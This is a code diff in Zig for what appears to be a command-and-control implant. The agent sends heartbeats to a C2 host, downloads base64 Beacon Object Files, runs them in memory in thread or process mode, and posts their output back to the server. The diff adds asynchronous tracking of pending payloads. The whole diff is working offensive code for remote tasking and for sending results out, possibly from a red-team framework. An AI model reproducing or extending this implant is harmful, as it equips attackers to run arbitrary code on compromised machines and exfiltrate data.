@@ -73,6 +73,7 @@ const State = struct {
     http_client: std.http.Client,
     heartbeat_header: std.http.Headers,
     heartbeat_uri: std.Uri,
+    pending_bofs: std.ArrayList(PendingBof),
 
     fn init(allocator: std.mem.Allocator) !State {
         const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
@@ -113,6 +114,7 @@ const State = struct {
             .http_client = http_client,
             .heartbeat_header = heartbeat_header,
             .heartbeat_uri = try std.Uri.parse("http://" ++ c2_host ++ c2_endpoint),
+            .pending_bofs = std.ArrayList(PendingBof).init(allocator),
         };
     }
 
@@ -122,7 +124,12 @@ const State = struct {
     }
 };
 
-fn process(allocator: std.mem.Allocator, state: *State) !void {
+const PendingBof = struct {
+    context: *bof.Context,
+    request_id: []const u8,
+};
+
+fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
     // send heartbeat to C2 and check if any tasks are pending
     var req = try state.http_client.open(.GET, state.heartbeat_uri, state.heartbeat_header, .{});
     defer req.deinit();
@@ -184,6 +191,7 @@ fn process(allocator: std.mem.Allocator, state: *State) !void {
             defer allocator.free(bof_content);
 
             const bof_object = try bof.Object.initFromMemory(bof_content);
+            errdefer bof_object.release();
 
             // process header
             const bof_header = root.object.get("header").?.string;
@@ -206,22 +214,51 @@ fn process(allocator: std.mem.Allocator, state: *State) !void {
                     null,
                     null,
                 );
-                bof_context.?.wait();
             } else if (std.mem.eql(u8, exec_mode, "process")) {
                 std.log.info("Execution mode: {s}-based", .{exec_mode});
+
+                bof_context = try bof_object.runAsyncProcess(
+                    @constCast(bof_args),
+                    null,
+                    null,
+                );
             }
 
-            if (bof_context) |context| if (context.getOutput()) |output| {
+            if (bof_context) |context| {
+                try state.pending_bofs.append(.{
+                    .context = context,
+                    .request_id = try allocator.dupe(u8, request_id),
+                });
+            }
+
+            // tasked to execute builtin command?
+        } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
+            std.log.info("Executing builtin command: {s}", .{cmd_name});
+        }
+    }
+}
+
+fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
+    var pending_bof_index: usize = 0;
+    while (pending_bof_index != state.pending_bofs.items.len) {
+        const pending_bof = state.pending_bofs.items[pending_bof_index];
+
+        if (pending_bof.context.isRunning()) {
+            pending_bof_index += 1;
+        } else {
+            const context = pending_bof.context;
+
+            if (context.getOutput()) |output| {
                 std.log.info("Bof output:\n{s}", .{output});
 
                 const out_b64 = try allocator.alloc(u8, state.base64_encoder.calcSize(output.len));
                 defer allocator.free(out_b64);
-                _ = std.base64.Base64Encoder.encode(&state.base64_encoder, out_b64, output);
+                _ = state.base64_encoder.encode(out_b64, output);
 
                 var h = std.http.Headers{ .allocator = allocator };
                 defer h.deinit();
                 try h.append("content-type", "text/plain");
-                try h.append("Authorization", request_id);
+                try h.append("Authorization", pending_bof.request_id);
 
                 var reqRes = try state.http_client.open(.POST, state.heartbeat_uri, h, .{});
                 defer reqRes.deinit();
@@ -231,14 +268,13 @@ fn process(allocator: std.mem.Allocator, state: *State) !void {
                 try reqRes.send(.{});
                 try reqRes.writeAll(out_b64);
                 try reqRes.finish();
+            }
 
-                bof_object.release();
-                context.release();
-            };
+            context.getObject().release();
+            context.release();
+            allocator.free(pending_bof.request_id);
 
-            // tasked to execute builtin command?
-        } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
-            std.log.info("Executing builtin command: {s}", .{cmd_name});
+            _ = state.pending_bofs.swapRemove(pending_bof_index);
         }
     }
 }
@@ -255,7 +291,8 @@ pub fn main() !void {
     defer bof.releaseLauncher();
 
     while (true) {
-        process(allocator, &state) catch {};
+        processCommands(allocator, &state) catch {};
+        processPendingBofs(allocator, &state) catch {};
         std.time.sleep(jitter * 1e9);
     }
 }
